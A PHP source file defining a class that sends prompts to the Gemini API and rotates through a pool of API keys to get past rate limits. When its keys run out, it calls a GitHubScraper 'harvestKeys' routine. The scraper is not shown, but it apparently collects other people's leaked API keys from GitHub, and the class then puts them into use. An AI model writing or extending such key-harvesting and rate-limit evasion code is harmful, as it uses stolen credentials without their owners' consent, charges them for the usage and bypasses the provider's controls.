<?php
require_once __DIR__ . '/KeyManager.php';
require_once __DIR__ . '/GitHubScraper.php';

class AiAdapter {
    private $keyManager;
    private $model = 'gemini-2.0-flash'; 

    public function __construct() {
        $this->keyManager = new KeyManager();
    }

    public function generateResponse($prompt) {
        $maxRetries = 3;
        $attempt = 0;

        while ($attempt < $maxRetries) {
            $apiKey = $this->keyManager->getOptimalKey();

            if (!$apiKey) {
                // Emergency Harvest
                $harvested = GitHubScraper::harvestKeys();
                foreach ($harvested as $k) $this->keyManager->addKey($k);
                
                // Try one more time after harvest
                $apiKey = $this->keyManager->getOptimalKey();
                if (!$apiKey) return "CRITICAL FAILURE: Neural Matrix Exhausted. No functional keys available.";
            }

            $result = $this->callGemini($apiKey, $prompt);

            if ($result['status'] === 200) {
                return $result['text'];
            } elseif ($result['status'] === 429) {
                // Rate limited
                $this->keyManager->reportFailure($apiKey, true);
                // Loop to retry with next key
            } else {
                // Other error
                $this->keyManager->reportFailure($apiKey, false);
            }
            
            $attempt++;
        }

        return "SYSTEM OVERLOAD: Neural network busy. Please retry.";
    }

    private function callGemini($apiKey, $prompt) {
        $url = "https://generativelanguage.googleapis.com/v1beta/models/{$this->model}:generateContent?key={$apiKey}";
        
        $payload = [
            'contents' => [
                [
                    'parts' => [
                        ['text' => $prompt]
                    ]
                ]
            ],
            'generationConfig' => [
                'temperature' => 0.8,
                'maxOutputTokens' => 1024,
                'topP' => 0.95
            ]
        ];

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($httpCode === 200) {
            $data = json_decode($response, true);
            $text = $data['candidates'][0]['content']['parts'][0]['text'] ?? "No text response.";
            return ['status' => 200, 'text' => $text];
        }

        return ['status' => $httpCode, 'text' => null];
    }
}
?>